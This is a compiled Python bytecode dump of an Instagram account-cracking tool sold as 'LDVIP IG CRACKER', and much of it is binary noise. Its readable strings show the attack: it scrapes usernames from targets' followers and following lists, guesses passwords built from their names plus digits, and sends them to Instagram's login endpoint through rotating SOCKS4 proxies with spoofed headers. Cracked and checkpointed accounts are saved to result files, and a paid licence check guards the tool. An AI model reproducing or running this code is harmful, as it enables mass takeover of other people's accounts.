o
    l(~b[  ?                   @   s^  z"d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZW n ey< Z	 ze
de	? d?? W Y dZ	[	ndZ	[	ww d dlZd dlZd dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZzd dlZW n' ey?   e?d? e?d? zd dlZW n ey?   e
d? Y nw Y nw d dlmZ d dlmZ d d	lmZ d d
lmZ  d dlm!Z" d dl#m$Z% d dlm&Z' d dl(m)Z* d dl+m,Z- d dlmZ d d
lmZ d dlmZ d d	lmZ. e?/? Z0dd? Z1e1?  e?2? ?3d?Z4dZ5dZ6ze?7d?j8Z9e:dd??;e9? W n e<?y Z	 z
e&d? W Y dZ	[	ndZ	[	ww e:dd??=? ?>? Z9dZ?dZ@g ZAze?Bd? W n   Y dZCd ZDd!ZEd"ZFd#ZGd$ZHd%ZId&ZJg g g g d g g g f\ZKaLaMaNaOaPZQZRe?S? ZTd'd(? ZUd)d*? ZVzejWZXW n   ejYjZZXY d+d,? Z[d-d.? Z\d/d0? Z]G d1d2? d2?Z^e_d3k?r?ze\?  W dS  ej`ja?y?   e
d4eD? d5eD? d6?? Y dS w dS )7?    Nz
 [[1;35m>[0m] module z belum terinstallzpip install rich?   zKTidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich))?Table)?Console)?BeautifulSoup)?ThreadPoolExecutor)?Group)?Panel)?print)?Markdown)?Columns)?sleep)?datetimec                  C   s?   t d? t d? tt?? ?tt?? ? } d?| ?}t d| ? z=t?d?j}||v r<t d? tt?? ?}t	?
d? W d S t d? t d	? t?d
| d ? td? t	?
d? t??  W d S    t??  tdkrrt t? t?  Y d S Y d S )Nz$[1;97m	YOUR ID IS NOT YET APPROVED
z!        TOOL PRICE 20$| 1 WEEKS
?-z[37;1m     YOUR ID : zhttps://pastebin.com/sbtpNLzNz)[1;92m          APPROVAL IS DETECTED...!?   z,  IF PAYMENT IS SUCCESSFUL SEND YOUR ID...
z1[1;91m  FREE USERS FUK OFF DONT INBOX ME.[LDVIP]zHam start https://t.me/FFRFF3?text=Hi+LDVIP+i+Want+to+pay+for+IG+linces:+z
>/dev/nullr   ?__main__)r	   ?str?os?geteuid?getlogin?join?requests?get?text?timer   ?systemZjeda?sys?exit?name?logo?xoshnaw)?uuid?idZhttpCaht?msg? r#   ?#/storage/emulated/0/Download/igg.pyr   $   s.   


?r   z%d-%b-%Y?   ?
   zwhttps://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=allz	.prox.txt?wZGAGAL?rz?https://www.instagram.com/accounts/login/?force_classic_login=&?https://www.instagram.com?resultz[96;1mz[1;32mz[1;31mz[1;33mz[1;35mz[38;2;255;127;0;1mz[0mz?Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)c                   C   s   t ?d? d S )N?clear)r   r   r#   r#   r#   r$   r+   ^   s   r+   c                  C   sF   t ?  d} t| dd?}t? ?|? d}t|dd?}tt|dd?? d S )Nz-                  LDVIP DAVID 2022 IG CRACKER?red??stylezNOWNER     :  LDVIP
GITHUB    :  https://github.com/LDVIP1
TELEGRAM  :  @FFRFF3zLDVIP ??title)r+   ?mark?solr	   ?nel?cetak)?wel?wel2?auZpengembang1r#   r#   r$   ?bannerb   s   r8   c           	   	   C   s?   t dd??? }z=tjd| d| idtid?}t|j? |?? d d }|d	 }|d
 d }|d d }t?	|? d|? d|? ?? W t|fS  t
tfyt   d}t|dd?}t? ?|? t?d? t?d? t?d? t?d? Y t|fS w )N?	.usernamer(   ?#https://www.instagram.com/%s/?__a=1?cookie?
user-agent??cookies?headers?graphql?user?	full_name?edge_followed_by?count?edge_follow?|z# Instagram Checkpointr,   r-   ?   ?
.kukis.log?python instagram.py)?open?read?sr   ?USNr	   r   ?json?external?append?
ValueError?KeyErrorr1   r2   r   r   r   ?remover   )	r;   rA   ?c?i?nama?	followers?	followingr5   r6   r#   r#   r$   ?cekAPIt   s(   

?


?rY   c                  C   s"  z	t dd??? } W ns ty|   t?  d}t|dd?}t? ?|? d}t|dd?}tt|dd?? t	d	t
? d
??}|dkrsd}t|dd?}t? ?|? t	t? dt
? ??}t	t? dt
? ??}t dd??|?} t dd??|?}t?d? n|dkrzt?  Y nw t| ?\}	}d| i}
t|	||
???  d S )NrH   r(   z# LOGIN METHODr,   r-   z[1] LOGIN USING COOKIEzCookie Loginr/   u   [➣] SELECT :? ?1z # CREATE NEW IG ACCOUNT TO LOGINu   [➣] IG USERNAME :u   [➣] IG COOKIE:r'   r9   rI   ?2r;   )rJ   rK   ?FileNotFoundErrorr8   r1   r2   r	   r3   r4   ?input?C?CY?writer   r   ?loginrY   ?	instagram?menu)Zkukir5   r6   ?io?oiZloginpil?usZcokrA   ?exr;   r#   r#   r$   ?checkin?   s6   ??ri   c                  C   sL  z$d} t | dd?}t? ?|? tt? dt? ??}tjt? dt? ?d?}W n ty>   d} t | dd?}t? ?|? t	?  Y nw t
||??? }|?d?d	krytd
d??|? tdd??|?d?? d|?d?i}tdt? dt? d?? t?d? d S |?d?dkr?d} t | dd?}t? ?|? t?  d S d} t | dd?}t? ?|? t?  d S )Nzo# Gunakan username dan password instagram untuk login. sebelum login pastikan akun bersifat publik bukan privatr,   r-   u   [•] Masukan username: u   [•] Masukan password: )?promptz*# KeyboardInterrupt terdeteksi... keluar !?status?successr9   ?arH   r;   ?
?>z Login berhasilzpython login.py?
checkpointz# Login checkpointz0# Username atau password yang anda masukan salah)r1   r2   r	   r^   r`   r_   ?	stdiomask?getpass?KeyboardInterruptr   ZinstagramAPIZloginAPIr   rJ   ra   ?Hr   r   rb   )r5   r6   rg   ?pw?xr;   r#   r#   r$   rb   ?   s8   
?

rb   c                   @   s?   e Zd Zdd? Zdd? Zdd? Zdd? Zd	d
? Zdd? Zdd? Z	dd? Z
dd? Zdd? Zdd? Zdd? Zdd? Zdd? Zdd? Zdd ? Zd!S )"rc   c                 C   s    || _ || _|| _t?? | _d S )N)?ext?usernamer;   r   ?SessionrL   )?selfrO   rx   r;   r#   r#   r$   ?__init__?   s   zinstagram.__init__c                 C   sd   t ?d? tD ]}z|?d?d }|?d?d }|?d?d }W q   Y qtt? dt? d?? d S )Nr+   rF   r   r   r   u\  

 _        ______  _________ _        _______ _________
( \      (  __  \ \__   __/( (    /|(  ____ \__   __/
| (      | (  \  )   ) (   |  \  ( || (    \/   ) (   
| |      | |   ) |   | |   |   \ | || (_____    | |   
| |      | |   | |   | |   | (\ \) |(_____  )   | |   
| |      | |   ) |   | |   | | \   |      ) |   | |   
| (____/\| (__/  )___) (___| )  \  |/\____) |   | |   
(_______/(______/ \_______/|/    )_)\_______)   )_(   
                                                      

 ╔══════════════════════════════════════════╗
 AUTHOR   : sajadalbkat
 GITHUB   : https://github.com/LDVIP1
 FB       : https://me.fb/Alikr93
 ╚══════════════════════════════════════════╝u?   
[01] PUBLIC ID SEARCH
[02] CRACK FROM FOLLOWERS
[03] CRACK FROM FOLLOWING [✓]
[04] CHECK CRACKED STATUS
[05] VIEW CRACKED RESULTS
[06] BOT STATUS
[>R] REPORT
[>C] CHANGE ID LOGIN
[>E] EXIT
	)r   r   rO   ?splitr	   r_   ?M)rz   rU   rV   rW   rX   r#   r#   r$   r   ?   s   
?zinstagram.logoc                 C   s*   d}t |dd?}tt |dd?? t?  d S )Nu?   [•] Bantu saya mengembangkan script ini. apapun bugnya tolong laporkan kepada saya, semakin dikit bugnya semakin baik scriptnya.
[•] Anda bisa melaporkan langsung ke wa admin 081902271822
[•] 40R3C ADMIN BAIK BANGET?cyanr-   z
REPORT BUGr/   ?r3   r4   r   )rz   ZbugZbug1r#   r#   r$   ?BUG?   s   
zinstagram.BUGc                 C   sj   d}t |dd?}tt |dd?? d}t |dd?}tt |dd?? d}t |dd?}tt |d	d?? t?  d S )
NzR[1] Fix bug login instagram
[2] Ganti tampilan scripts
[3] Fix bug lisensi invalidr~   r-   zFitur yang di updater/   z-[1] Bot unfollow instagram
[2] Bot spam komenzFitur tambahanz?[1] Untuk fitur brute force masih dalam perbaikan
[2] Untuk fitur Bot unfollow masih dalam perbaikan
[3] Untuk fitur bot komen masih dalam perbaikanzFix Bugr   )rz   re   rf   r#   r#   r$   ?	ChangeLog?   s   
zinstagram.ChangeLogc                 C   s|   d}t |dd?}t? ?|? tdt? dt? ??}|dv r-t?d? t?d? t?d	? d S |d
v r8t?d	? d S | ?	?  d S )Nz"# Apakah anda yakin ingin keluar ?r,   r-   rn   u   [•] Jawaban [y/t] : )?y?YrH   r9   rI   )?t?T)
r1   r2   r	   r^   r`   r_   r   rS   r   ?Exit)rz   ZkelZkel1rv   r#   r#   r$   r?     s   

zinstagram.Exitc                 C   s>   d| d }t ?|?}|?? }t|d d ?d??d??}|S )NzFhttps://www.instagram.com/web/search/topsearch/?context=blended&query=z&&rank_token=0.3953592318270893&count=1?usersr   rA   ?pk)r   r   rN   r   )rz   ?six_id?urlrv   ?x_jason?uidr#   r#   r$   ?sixAPI  s
   
zinstagram.sixAPIc              	   C   s?   t d?}| jjddt? id?j}t?dt|??d }tj?	ddd	d
dt? d?? t
?||||d??}d?| ? d?tj?|??| _tjd| | j|d?jS )NT?https://www.instagram.com/r<   ?r?   z'{"config":{"csrf_token":"(.*)","viewer"r   ?close?*/*z0application/x-www-form-urlencoded; charset=UTF-8z
$Version=1zen-US)?
Connection?AcceptzContent-type?Cookie2zAccept-Languagez
User-Agent)?_uuidZ_uid?user_idZ
_csrftokenz&signed_body={}.{}&ig_sig_key_version=4Fz6https://i.instagram.com/api/v1/friendships/destroy/%s/)r>   )ZgenerateUUIDrL   r   ?
User_Agent?content?re?findallr   r?   ?updaterN   ?dumps?format?urllib?request?quote?payload?postr   )rz   r?   Zusername_idr;   r    ?xx?	crf_token?datar#   r#   r$   ?unfollowAPI  s(   ??
?zinstagram.unfollowAPIc           	   	   C   s?   z2t jd| |dtid?}t?|j?}|d D ]}|d }|d }|d }t?|? d|? ?? qW tS  tj	j
yI   td	t? d
t? d?? Y tS w )Nz?https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=truer<   r=   r?   rA   rx   rB   rF   ?
 [?!z] Koneksi internet bermasalah)rL   r   rM   rN   ?loadsr   ?internalrP   r   ?
exceptions?ConnectionErrorr   r}   r_   )	rz   r;   rV   rv   r?   rU   rA   rx   ?fullnamer#   r#   r$   ?	searchAPI.  s   ???zinstagram.searchAPIc              
   C   s?   zt jd| |dtid?}|?? d d }|d }W |S  tjjy1   tdt? dt	? ?? Y |S  t
yM } ztdt? d	t	? ?? W Y d }~|S d }~ww )
Nr:   r<   r=   r@   rA   r!   rn   ?"   ┣[!] Koneksi internet bermasalahuR   ┣[!] Username yang anda masukan tidak di temukan pastikan target bersifat publik)rL   r   rM   rN   r   r?   r?   r   r}   r_   ?	Exception)rz   r;   r!   ?mZm_jason?idx?er#   r#   r$   ?idAPI;  s   
????zinstagram.idAPIc              
   C   s?  z?t j|| |dtid?}t?|j?}|d D ]}|d }|d }t?|? d|? ?? t?|? qdt	v r?|d }	t
d	?D ]S}
t jd
| d |	 |dtid?}t?|j?}z.|d D ]}|d }|d }t?|? d|? ?? t?|? qZz|d }	W n   Y W  nW q=   d|jv r?Y  nY q=W tS W tS W tS 	 W tS  tjjy?   tdt? dt? ?? Y tS  ty? } ztdt? dt? ?? W Y d }~tS d }~ww )Nr<   r=   r?   rx   rB   rF   ?pengikutZnext_max_idi'  z+https://i.instagram.com/api/v1/friendships/z/followers/?count=100&max_id=?	challengern   r?   u2   ┣[!] Username yang anda masukan tidak di temukan)rL   r   rM   rN   r?   r   r?   rP   rX   ?menudump?ranger   r?   r?   r   r}   r_   r?   r	   )rz   r;   ?apir!   rv   r?   rU   rx   rV   Zmaxid?zr?   r#   r#   r$   ?infoAPIF  sX    ?
????????zinstagram.infoAPIc                 C   s?   t dt? t? dt? tt?? t? ?? t d? tdt? dt? d??}|dkr-| ?||? d S |dkr9| ?||? d S |d	krE| ?||? d S | ?|? d S )
N?
 z Total Username uz   
 [?] LDVIP CRACKING METHOD [?]

 [1]. LDVIP PRO    [✓]
 [2]. LDVIP MBASIC [✓✓]
 [3]. LDVIP MOBILE [✓✓✓✓]
		rZ   u   ➣z LDVIP 1 - 3 : r[   r\   ?3)r	   r_   r}   ?lenr?   r^   ?generateAPI?passwordAPI)rz   ZxnxrT   r#   r#   r$   r?   k  s   $zinstagram.passwordAPIc                 C   s?  t dt? dt? dt? dt? dt? dt? dt? dt? d	?? td
d???}|D ]?}z?|?d?d }|?d?d ?? }|?d?D ]?}t|?dk rFq=|?? }|dkrmt|?dks`t|?dks`t|?dkri|d |d g}n]|g}nY|dkr?t|?dks?t|?dks?t|?dkr?|d ||d |d g}n6|d ||d |d g}n)|dkr?t|?dks?t|?dks?t|?dkr?|d ||?? g}n	|d ||?? g}|?| j||? q=W q%   Y q%W d   ? n1 s?w   Y  t d? d}	t	|	dd?}
t
? ? |
? t?  d S )Nr?   u   ✓z] OK RESULTS SAVED TO: result/z.txt
 [?Xz] CP RESULTS SAVED TO: result/z.txt

 [r?   z] USE FIGHT MODE FOR 2SEC
		?   )Zmax_workersrF   r   r   rZ   ?   r[   rG   r%   Z123Z1234r\   Z12345r?   rn   z# CRACK COMPLETED?yellowr-   )r	   r}   ?dayr   r|   ?lowerr?   Zsubmit?crackAPIr1   r2   r   )rz   rA   ?oZshinkairU   rx   ?passwordr'   Zsandirf   re   r#   r#   r$   r?   ~  sb   ???????
?$$$???
zinstagram.generateAPIc                 C   sl   z+t jd| dtid?}|?? d d }|d }|d d }|d	 d }|d
 d }W n   Y ||||fS )Nr:   r<   r?   r@   rA   rB   rC   rD   rE   Zedge_owner_to_timeline_media)rL   r   rM   rN   )rz   rA   rv   r?   rV   r?   ?mengikut?	postinganr#   r#   r$   ?APIinfo?  s   zinstagram.APIinfoc                 C   sR  t j?dt? t? dtt?? t? dt? dtt	?? t? dt
? dt? d??f t j??  ?z?|D ?]?}t?t?}t?t?}dd	| i}d
}t?g d??}d}	t?g d??}
t?dd?}t?g d??}d}t?dd?}d}t?dd?}t?dd?}d}|? d|? d|	? |
? |? |? d|? |? d|? d|? d|? d|? ?}t?d?}i dd?dd ?d!d"?d#d?d$d%?d&d'?d(d)?d*d+?d,d-?d.d/?d0|?d1d2?d3|jd4 ?d5d6?d7d8?d9d:?d;d<?dd=d>d???}d@|? dA|? ?|dBdCdDdCdE?}tjdF|||dG?}t?|j?}dHt|?v ?rN| ?|?\}}}}dI|? dJ|? dK|? dL|? dM|? dN|? ?}t|dOdP?}tdQ? tt|dRdS?? tdTt ? dU?dV??|? dW|? dW|? dW|? dQ?? t	?!|?  n?dXt|?v ?r?| ?|?\}}}}dI|? dJ|? dK|? dL|? dM|? dN|? ?}tdQ? t|dYdP?}tt|dZdS?? td[t ? dU?dV??|? dW|? dW|? dW|? dQ?? t"?!|?  nsd\t|j?v ?r?t j?d]t? d^t? dt? d_t? ?? t j??  t#d`? q-dat|j?v ?r?t j?d]t? d^t? dt? dbt? ?? t j??  t#d`? | ?$||? q-dct|j?v ?rt j?ddt? d^t? dt? det? ?? t j??  t#d`? q-q-td7 aW d S    | ?$||? Y d S )fNu
    ❣️ [?/?] zOK: - ?  zCP: - 0rZ   ?httpz	socks4://zMozilla/5.0 (Linux; Android )	?4?5?6?7?8?9?10?11?12zSAMSUNG GT-)?A?Br_   ?D?E?F?Grt   ?I?J?K?Lr}   ?N?O?P?Q?R?Sr?   ?U?V?Wr?   r?   ?Zr   i?  z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/?I   ?d   ?0ih  i$  ?(   ??   zMobile Safari/537.36z; z) ?.z@https://www.instagram.com/accounts/login/?next=/accounts/logout/?Host?www.instagram.comz	sec-ch-uaz(" Not A;Brand";v="99", "Chromium";v="98"?x-ig-app-idZ1217981644879628?x-ig-www-claimzsec-ch-ua-mobilez?1?x-instagram-ajaxZ2296f2f215da?content-type?!application/x-www-form-urlencoded?acceptr?   ?x-requested-with?XMLHttpRequestz	x-asbd-idZ198387r<   zsec-ch-ua-platformz	"Android"?x-csrftokenZ	csrftoken?originr)   ?sec-fetch-site?same-origin?sec-fetch-mode?cors?sec-fetch-dest?emptyzgzip, deflate, brzen-US;q=0.8,en;q=0.7)?refererzaccept-encoding?accept-languagez#PWD_INSTAGRAM_BROWSER:0:?:?falsez{}? )?enc_passwordrx   ?optIntoOneTap?queryParams?stopDeletionNonce?trustedDeviceRecords?.https://www.instagram.com/accounts/login/ajax/)r?   r?   ?proxies?userId?Nama     : ?
USERNAME : ?
PASSWORD : ?
FOLLOWERS : ?
FOLLOWING: ?
POST: ?greenr-   rn   z	LDVIP- OKr/   zresult/success-z.txtrm   rF   ?checkpoint_urlr?   z	LDVIP- CPzresult/checkpoint-?Please wait a few minutesu   ┣[r?   zIP SPAMr   Zip_blockzIP BLOCKZspam?ZIp)%r   ?stdoutra   r?   ?loopr?   r?   r_   rt   rl   r}   ?flush?calendar?timegm?current_GMT?random?choice?prox?	randrangerL   r   r>   r?   rN   r?   r   r   r?   r3   r	   r4   rJ   r?   rP   rp   r   r?   )rz   rA   Zpasru   ?tsZnipZproxsZaa?brT   ?dr?   ?f?g?hrU   ?j?k?lZuaku?tokenr?   ?paramrv   r?   rV   r?   r?   r?   re   rf   r#   r#   r$   r?   ?  s?   H



B
????????	?
???
???????(0
(0
868zinstagram.crackAPIc                 C   s?  z?t jddt? id?j}t?dt|??d }t j?dddd	d
t	? d|dddddddd?? |d?
t?dd?|?di di d?}t jd|d?}td? t?|j?}d|jv r?| ?|?\}}	}
}d|? d|? d|? d |	? d!|
? d"|? ?}t|d#d$?}td%? tt|d&d'?? W d S d(|jv r?| ?|?\}}	}
}d|? d|? d|? d |	? d!|
? d"|? ?}t|d)d$?}td%? tt|d*d'?? W d S d+t|j?v r?tj?d,t? d-t? d.t? d/t? ?? tj??  td0? | ?||? W d S W d S    | ?||? Y d S )1Nr?   r<   r?   z\"csrf_token\"\:\"(.*?)\"r   r?   z5hmac.AR08hbh0m_VdJjwWvyLFMaNo77YXgvW_0JtSSKgaLgDdUu9hZ82a581bb9399r?   r?   r?   Z936619743392459r)   r  r  r  zen-GB,en-US;q=0.9,en;q=0.8)?	authorityr?   r?   r?   r?   r<   r?   r?   r?   r?   r   r  r  r  r  z#PWD_INSTAGRAM_BROWSER:0:{}:{}i ʚ;l   ?g?] Fr
  )rx   r  r  r  r  r  r  )r?   r   r  r  r  r  r  r  r  r  r-   rn   zLDVIP-OKr/   r  r?   ?LDVIP-CPr  z r?   r?   z Please wait a few minutes secondr&   )rL   r   r?   r?   r?   r?   r   r?   r?   ?
user_agentr?   r#  ?randintr?   r   rN   r?   r   r?   r3   r	   r4   r   r  ra   r?   r_   r  ?checkAPI)rz   rA   ru   r0  r?   r1  rv   r?   rV   r?   r?   r?   re   rf   r#   r#   r$   r6    s^   ??
(
(6?zinstagram.checkAPIc                 C   s?  | ? ?  tdt? dt? d??}|dkr| ??  d S |dv rrd}t|dd?}t? ?|? ttd	t? d
t	? ???}td? d}t|dd?}t? ?|? t
|?D ]}|d  tt? dt? tt?? t	? d??}| ?| j|?}qM| ?|? d S |dv r?t?d? d}t|dd?}t? ?|? tt? dt	? ??}| ?| j|?}| ?| jd|?}	| ?|	? d S |dv r?tt? dt? ??}| ?| j|?}| ?| jd|?}	| ?|	? d S |dv ?r>td? t?d?D ]}tdt? dt	? d|? ?? q?tdt? dt	? ??}td| ??? ?? }
td	t? d t? t|
?? t	? ?? td	t? d!t	? d	?? |
D ]}|?d"?d# }|?d"?d }| ?||? ?qtd$t? d%t	? ?? d S |d&v ?r?td? t?d?D ]}tdt? dt	? d|? ?? ?qLtdt? dt	? ??}td| ??? ?? }
|?d'?}|d# }td	t? d(t? t|
?? t	? d)?? |
D ?]$}|?d"?d# }|?d"?d }|?d"?d* }|?d"?d+ }|d,k?r2td?g d-?t? ?d.?t	? ?d?t? ?d/?t	? ?d0?t? ?d"?t	? ?d1?t? ?d2?t	? ?d3?t ? ?|? ?t	? ?d1?t? ?d2?t	? ?d4?t ? ?|? ?t	? ?d1?t? ?d2?t	? ?d5?t ? ?|? ?t	? ?d1?t? ?d2?t	? ?d6?t ? ?|? ?t	? ?d7??? t!d8? ?q?td?g d1?t? ?d9?t	? ?t? ?d:?t	? ?d1?t? ?d9?t	? ?t? ?d;?t? ?|? ?t	? ?d1?t? ?d9?t	? ?t? ?d<?t? ?|? ?t	? ?d1?t? ?d9?t	? ?t? ?d=?t? ?|? ?t	? ?d1?t? ?d9?t	? ?t? ?d>?t? ?|? ?t	? ?d7??? t!d8? ?q?d S |d?v ?r-d#}td-t? d@t	? dA?? tdBdC??? }t"?#dD|?d# }| ?| jd|?}t$D ];}|d7 }t!t%t&?'t(dE t)dE ?dE ?? | ?*|?}tdt+|?? t? dFt	? d|? dt? dGt	? ?? | ?,|dH| j? ?q?tdIt? dJt	? dK?? | ??  d S |dLv ?r8| ?-?  d S |dMv ?rC| ?.?  d S |dNv ?rN| ?/?  d S | ??  d S )ONrZ   z	[LDVIP] :r?   r
  )r[   ?01z# Masukan jumlah targetr  r-   rn   u   [•] Jumlah : z(# Masukan nama ranfom untuk di searchingr   u   ┣[>] Masukan nama (z): )r\   ?02r?   z# ID PUBLICr,   u   [•] USER NAME: zBhttps://i.instagram.com/api/v1/friendships/%s/followers/?count=100)r?   ?03u   [➣] USERNAME : zEhttps://i.instagram.com/api/v1/friendships/%s/following/?count=100000)r?   ?04r*   z [ro   r?   r?   u   ┣>>> Masukan nama file: z	result/%su   ┣[+] Total Result MASTER_FUu<   ┣[!] Proses mengecek status akun. silahkan tunggu sebentarrF   r   z

u   ┣[#] proses check selesai...)r?   ?05r   u%   ┣[>] Total result yang di temukan [?]r   r?   rp   r?   ?+r3  z:
  z
  u   ├╴>z USERNAME: z PASSWORD: z FOLLOWERS: z FOLLOWING: z
					g????????z[>]z STATUS : LDVIP-OK z USERNAME : z PASSWORD : z FOLLOWERS : z FOLLOWING : )r?   ?06r?   z] Bot Unfollow-All Dijalankan
rH   r(   zsessionid=(\d+)r&   ?}zUnfollow-BerhasilZ
5452333948z

 [?#z] Unfollow-all selesai...)r(   r?   )rT   r_   )r?   r?   )0r   r^   r}   rd   r1   r2   r	   ?intr`   r_   r?   rt   r?   r?   r?   r;   r?   r?   rP   r?   r?   r   ?listdirr?   rJ   rK   ?
splitlinesr|   r6  r   r?   r   r?   r   r?   r?   rX   ?floatr#  ?uniform?nyMnD?nyMxDr?   r   r?   r?   r?   r?   )rz   rT   ZmasZmas1r?   rU   rV   r   r!   ?infor+  rL   ?usr?pwdr?   ZxcZfolZful?sixrv   Zx_id?backr?   r#   r#   r$   rd   F  s?    

 

"

???????????????????????????????????????????????????????
 
."


zinstagram.menuN)?__name__?
__module__?__qualname__r{   r   r?   r?   r?   r?   r?   r?   r?   r?   r?   r?   r?   r?   r6  rd   r#   r#   r#   r$   rc   ?   s"    &%)^4rc   r   r?   r?   z] Internet connection problem)brN   r    ?hmacr#  ?hashlibr?   rq   ?urllib.request?ImportErrorr?   r   r   Zbs4r   r   r   r   r?   r   Zrichr   r   Z
rich.tabler   ?meZrich.consoler   r2   r   ZsopZconcurrent.futuresr   Ztredr   ZgpZ
rich.panelr   r3   r	   r4   Zrich.markdownr
   r1   Zrich.columnsr   ?col?parser?gmtimer"  r   ?now?strftimer?   rF  rG  r   r   r%  rJ   ra   r?   rK   rC  Z	insta_logr?   r?   ?mkdirr`   rt   r}   r?   r?   r?   r_   rM   r?   rO   rl   rp   r  rX   ZlisensikuniZ	lisensikury   rL   r+   r8   r?   Zurllib_quote_plus?parse?
quote_plusrY   ri   rb   rc   rM  r?   r?   r#   r#   r#   r$   ?<module>   s?    ??P

?????$	

   
t??